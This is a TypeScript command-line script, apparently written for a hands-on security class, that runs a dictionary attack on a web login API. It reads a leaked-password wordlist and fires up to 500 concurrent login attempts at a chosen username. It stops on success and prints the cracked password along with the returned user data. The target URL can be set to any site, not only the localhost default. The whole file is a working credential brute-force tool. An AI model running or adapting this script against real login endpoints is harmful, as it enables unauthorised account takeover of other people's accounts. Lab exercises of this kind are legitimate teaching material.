#!/usr/bin/env tsx
/**
 * dictionary-attack.ts
 * 辞書攻撃ツール（実習用）
 *
 * 使い方:
 *   npm run attack -- --target <username> [options]
 *
 * オプション:
 *   --target   <string>   攻撃対象のユーザー名 (必須)
 *   --wordlist <path>     パスワードリストのパス (デフォルト: rockyou.json)
 *   --url      <string>   ベースURL (デフォルト: http://localhost:3000)
 *   --limit        <number>   試行上限数 (デフォルト: 無制限)
 *   --concurrency  <number>   同時リクエスト数 (デフォルト: 500)
 *   --log-interval <number>   進捗ログを出力する試行間隔 (デフォルト: 1)
 *   --verbose                 全試行のログを出力 (--log-interval より優先)
 */

import fs from 'fs';
import path from 'path';
import readline from 'readline';

// ─── CLI 引数パース ────────────────────────────────────────────────────────────

const args = process.argv.slice(2);

function getArg(flag: string): string | undefined {
  const idx = args.indexOf(flag);
  return idx !== -1 ? args[idx + 1] : undefined;
}

function hasFlag(flag: string): boolean {
  return args.includes(flag);
}

const TARGET   = getArg('--target');
const WORDLIST = getArg('--wordlist') ?? path.resolve(process.cwd(), 'rockyou.json');
const BASE_URL = getArg('--url')      ?? 'http://localhost:3000';
const LIMIT        = getArg('--limit')        ? parseInt(getArg('--limit')!,        10) : Infinity;
const CONCURRENCY  = getArg('--concurrency')  ? parseInt(getArg('--concurrency')!,  10) : 500;
const LOG_INTERVAL = getArg('--log-interval') ? parseInt(getArg('--log-interval')!, 10) : 1;
const VERBOSE      = hasFlag('--verbose');
const API_URL      = `${BASE_URL}/api`;

if (!TARGET) {
  console.error(JSON.stringify({
    event: 'error',
    timestamp: new Date().toISOString(),
    message: '--target オプションは必須です。例: npm run attack -- --target admin',
  }, null, 2));
  process.exit(1);
}

if (!fs.existsSync(WORDLIST)) {
  console.error(JSON.stringify({
    event: 'error',
    timestamp: new Date().toISOString(),
    message: `パスワードリストが見つかりません: ${WORDLIST}`,
  }, null, 2));
  process.exit(1);
}

// ─── ログ出力ヘルパー ──────────────────────────────────────────────────────────

function log(obj: Record<string, unknown>): void {
  console.log(JSON.stringify({ timestamp: new Date().toISOString(), ...obj }));
}

// ─── ログイン試行 ──────────────────────────────────────────────────────────────

async function tryLogin(username: string, password: string): Promise<{
  success: boolean;
  status: number;
  body: unknown;
}> {
  const res = await fetch(API_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username, password }),
  });
  const body = await res.json();
  return { success: res.status === 200, status: res.status, body };
}

// ─── メイン処理 ───────────────────────────────────────────────────────────────

async function main(): Promise<void> {
  const startTime = Date.now();

  log({
    event: 'start',
    target: TARGET,
    wordlist: WORDLIST,
    api_url: API_URL,
    limit: LIMIT === Infinity ? 'unlimited' : LIMIT,
    concurrency: CONCURRENCY,
    log_interval: VERBOSE ? 'verbose (all)' : LOG_INTERVAL,
    verbose: VERBOSE,
  });

  const fileStream = fs.createReadStream(WORDLIST, { encoding: 'utf8' });
  const rl = readline.createInterface({ input: fileStream, crlfDelay: Infinity });

  let attempt       = 0; // 完了した試行数
  let queued        = 0; // 送信済み（完了待ち含む）試行数
  let skipped       = 0;
  let found         = false;
  let foundPassword: string | null = null;
  const activePromises = new Set<Promise<void>>();

  // 1件のリクエストを発火し、完了した瞬間にログを出力する
  const runOne = (password: string): void => {
    const p: Promise<void> = tryLogin(TARGET!, password)
      .then((result) => {
        attempt++;

        if (VERBOSE) {
          log({
            event: result.success ? 'hit' : 'miss',
            attempt,
            target: TARGET,
            password,
            status: result.status,
          });
        } else if (attempt % LOG_INTERVAL === 0) {
          const elapsedSec = ((Date.now() - startTime) / 1000).toFixed(1);
          const rate       = (attempt / parseFloat(elapsedSec)).toFixed(0);
          log({
            event: 'progress',
            attempts: attempt,
            concurrency: CONCURRENCY,
            elapsed_sec: parseFloat(elapsedSec),
            rate_per_sec: parseInt(rate, 10),
            last_password: password,
          });
        }

        if (result.success) {
          found         = true;
          foundPassword = password;
          const user    = (result.body as { user?: Record<string, unknown> }).user ?? null;
          const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
          const banner  = '='.repeat(60);
          const message = `Target:${TARGET} Password:${foundPassword}`;

          // バナーを stderr（非バッファリング）で先に出力してから JSON ログを出す
          console.error('');
          console.error(banner);
          console.error('  ** PASSWORD FOUND! **');
          console.error(banner);
          console.error(`  Target   : ${TARGET}`);
          console.error(`  Password : ${foundPassword}`);
          console.error(`  Attempts : ${attempt}`);
          console.error(`  Elapsed  : ${elapsed}s`);
          console.error(`  User     : ${user ? JSON.stringify(user) : 'n/a'}`);
          console.error(banner);
          console.error('');

          // JSON ログ（stdout）
          log({
            event: 'success',
            target: TARGET,
            password: foundPassword,
            attempt,
            elapsed_sec: parseFloat(elapsed),
            user,
            message,
          });

          rl.close();
          fileStream.destroy();
        }
      })
      .catch((err) => {
        attempt++;
        log({ event: 'request_error', attempt, password, error: String(err) });
      })
      .finally(() => {
        activePromises.delete(p);
      });

    activePromises.add(p);
  };

  for await (const line of rl) {
    if (found) break;

    const password = line.trim();

    // rockyou.json の先頭 `{` と末尾 `}` をスキップ
    if (password === '{' || password === '}' || password === '') {
      skipped++;
      continue;
    }

    if (queued >= LIMIT) {
      log({ event: 'limit_reached', limit: LIMIT, attempts: queued });
      break;
    }

    queued++;

    // プールが満杯なら最初の1件の完了を待ってからスロットを空ける
    if (activePromises.size >= CONCURRENCY) {
      await Promise.race(activePromises);
    }

    if (found) break;

    runOne(password);
  }

  // 飛行中のリクエストをすべて待つ
  if (activePromises.size > 0) {
    await Promise.allSettled(activePromises);
  }

  const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);

  if (!found) {
    log({
      event: 'exhausted',
      target: TARGET,
      total_attempts: attempt,
      skipped_lines: skipped,
      elapsed_sec: parseFloat(elapsed),
      message: 'パスワードリストを使い切りましたが、一致するパスワードは見つかりませんでした。',
    });
  }

  log({
    event: 'end',
    target: TARGET,
    total_attempts: attempt,
    skipped_lines: skipped,
    elapsed_sec: parseFloat(elapsed),
    rate_per_sec: attempt > 0 ? parseFloat((attempt / parseFloat(elapsed)).toFixed(1)) : 0,
    result: found ? 'found' : 'not_found',
    ...(found ? { password: foundPassword } : {}),
  });
}

main().catch((err) => {
  log({ event: 'fatal', error: String(err) });
  process.exit(1);
});
